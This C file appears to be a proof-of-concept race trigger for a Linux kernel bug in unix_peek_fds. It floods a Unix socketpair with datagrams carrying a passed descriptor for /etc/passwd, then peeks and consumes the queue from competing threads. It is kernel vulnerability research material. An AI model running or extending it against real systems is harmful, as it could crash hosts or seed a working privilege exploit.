/*
 * PoC for WMI-3: unix_peek_fds
 * Try a race condition: two threads peek from the same socket simultaneously
 * while a third thread sends and consumes.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>

static int sv[2];
static volatile int stop = 0;
static volatile int count = 0;

void *peeker(void *arg)
{
    struct msghdr msg;
    struct iovec iov;
    char buf[64];
    char cmsg_buf[CMSG_SPACE(sizeof(int))];
    int ret;

    while (!stop) {
        memset(&msg, 0, sizeof(msg));
        memset(cmsg_buf, 0, sizeof(cmsg_buf));
        iov.iov_base = buf;
        iov.iov_len = sizeof(buf);
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = cmsg_buf;
        msg.msg_controllen = sizeof(cmsg_buf);

        ret = recvmsg(sv[1], &msg, MSG_PEEK | MSG_DONTWAIT);
        if (ret >= 0) {
            struct cmsghdr *c = CMSG_FIRSTHDR(&msg);
            if (c && c->cmsg_level == SOL_SOCKET && c->cmsg_type == SCM_RIGHTS) {
                int rfd = *(int *)CMSG_DATA(c);
                if (rfd >= 0) close(rfd);
            }
            __sync_fetch_and_add(&count, 1);
        }
    }
    return NULL;
}

void *consumer(void *arg)
{
    struct msghdr msg;
    struct iovec iov;
    char buf[64];
    char cmsg_buf[CMSG_SPACE(sizeof(int))];
    int ret;
    int i;

    for (i = 0; i < 2000; i++) {
        memset(&msg, 0, sizeof(msg));
        memset(cmsg_buf, 0, sizeof(cmsg_buf));
        iov.iov_base = buf;
        iov.iov_len = sizeof(buf);
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = cmsg_buf;
        msg.msg_controllen = sizeof(cmsg_buf);

        ret = recvmsg(sv[1], &msg, MSG_DONTWAIT);
        if (ret < 0) {
            usleep(10);
            i--;
            continue;
        }
    }
    stop = 1;
    return NULL;
}

int main(void)
{
    int fd_to_send;
    struct msghdr msg;
    struct iovec iov;
    char buf[64];
    char cmsg_buf[CMSG_SPACE(sizeof(int))];
    struct cmsghdr *cmsg;
    int ret;
    int i;
    pthread_t p1, p2, ct;

    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0) {
        perror("socketpair");
        return 1;
    }

    fd_to_send = open("/etc/passwd", O_RDONLY);
    if (fd_to_send < 0) {
        perror("open");
        return 1;
    }

    /* Send many messages */
    for (i = 0; i < 2000; i++) {
        memset(&msg, 0, sizeof(msg));
        memset(buf, 0x41, sizeof(buf));
        iov.iov_base = buf;
        iov.iov_len = sizeof(buf);
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = cmsg_buf;
        msg.msg_controllen = sizeof(cmsg_buf);
        cmsg = CMSG_FIRSTHDR(&msg);
        cmsg->cmsg_level = SOL_SOCKET;
        cmsg->cmsg_type = SCM_RIGHTS;
        cmsg->cmsg_len = CMSG_LEN(sizeof(int));
        *(int *)CMSG_DATA(cmsg) = fd_to_send;

        ret = sendmsg(sv[0], &msg, 0);
        if (ret < 0) {
            perror("sendmsg");
            return 1;
        }
    }
    printf("Sent 2000 messages with SCM_RIGHTS\n");

    pthread_create(&p1, NULL, peeker, NULL);
    pthread_create(&p2, NULL, peeker, NULL);
    pthread_create(&ct, NULL, consumer, NULL);

    pthread_join(ct, NULL);
    pthread_join(p1, NULL);
    pthread_join(p2, NULL);

    printf("Total peeks: %d\n", count);

    close(fd_to_send);
    close(sv[0]);
    close(sv[1]);

    return 0;
}
